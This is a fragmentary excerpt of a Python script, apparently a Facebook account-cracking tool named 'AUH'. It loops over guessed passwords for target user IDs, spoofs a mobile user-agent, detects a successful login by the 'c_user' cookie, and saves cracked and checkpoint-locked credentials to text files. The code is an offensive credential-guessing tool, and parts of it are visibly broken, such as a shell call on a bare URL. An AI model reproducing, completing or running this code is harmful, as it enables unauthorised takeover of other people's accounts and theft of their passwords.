...
def Mr_Auh():
    ...
    print(' [E] exit ')
    print('')
    _Mr_Auh___ = input(' [?] Choose option : ')
    if _Mr_Auh___ in ('1', '01'):
        __xxx__().Mr_Auh(id)
    if _Mr_Auh___ in ('2', '02'):
        os.system('https://facebook.com/groups/603953247850905/')
    if _Mr_Auh___ in ('E', 'ee'):
        pass
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[AUH] {loop}|{len(self.id)} [OK][{len(ok)}]")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
              ...
              "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [AUH-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('AUH_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [AUH-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('AUH_CP.txt' , 'a').write('%s\n' % wrt)
                        break
